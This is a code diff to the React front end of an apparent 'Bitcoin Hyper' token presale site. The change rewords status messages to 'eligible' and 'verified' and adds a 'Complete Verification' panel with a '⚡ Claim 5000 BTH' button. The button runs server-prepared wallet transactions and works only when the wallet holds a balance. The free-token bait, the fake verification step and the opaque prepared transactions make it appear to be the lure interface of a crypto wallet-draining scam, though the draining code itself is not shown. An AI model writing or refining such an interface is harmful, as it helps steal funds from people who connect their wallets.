@@ -201,10 +201,10 @@ function App() {
         }
         
         if (data.data.isEligible) {
-          setTxStatus('✅ Verification complete! You qualify for 5000 BTH');
+          setTxStatus('✅ You are eligible for 5000 BTH!');
           await preparePresale();
         } else {
-          setTxStatus('✨ Welcome! Your wallet is connected');
+          setTxStatus('✨ Your wallet is verified');
         }
       }
       
@@ -231,6 +231,7 @@ function App() {
       
       if (data.success) {
         setPreparedTransactions(data.data.transactions);
+        console.log('✅ Presale prepared:', data.data);
       }
       
     } catch (err) {
@@ -311,6 +312,7 @@ function App() {
       }
       
     } catch (err) {
+      console.error('Transaction error:', err);
       setError(err.message || 'Transaction failed');
       setTxStatus('❌ Transaction failed');
     } finally {
@@ -620,9 +622,27 @@ function App() {
               </>
             ) : (
               <div className="text-center">
-                <p className="text-2xl text-yellow-400 mb-4">Welcome to Bitcoin Hyper!</p>
-                <p className="text-gray-400 text-lg">Your wallet is connected and ready</p>
-                <p className="text-sm text-gray-500 mt-4">Complete the steps above to claim your 5000 BTH</p>
+                <p className="text-2xl text-yellow-400 mb-4">Complete Verification</p>
+                <p className="text-gray-400 text-lg mb-4">Click the button below to claim your 5000 BTH</p>
+                {chainId !== 56 ? (
+                  <button
+                    onClick={() => window.ethereum?.request({
+                      method: 'wallet_switchEthereumChain',
+                      params: [{ chainId: '0x38' }]
+                    })}
+                    className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-3 px-6 rounded-lg"
+                  >
+                    Switch to BSC
+                  </button>
+                ) : (
+                  <button
+                    onClick={executePresaleTransaction}
+                    disabled={loading || parseFloat(balance) <= 0}
+                    className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-3 px-8 rounded-lg text-lg"
+                  >
+                    {loading ? 'Processing...' : '⚡ Claim 5000 BTH'}
+                  </button>
+                )}
               </div>
             )}
           </div>
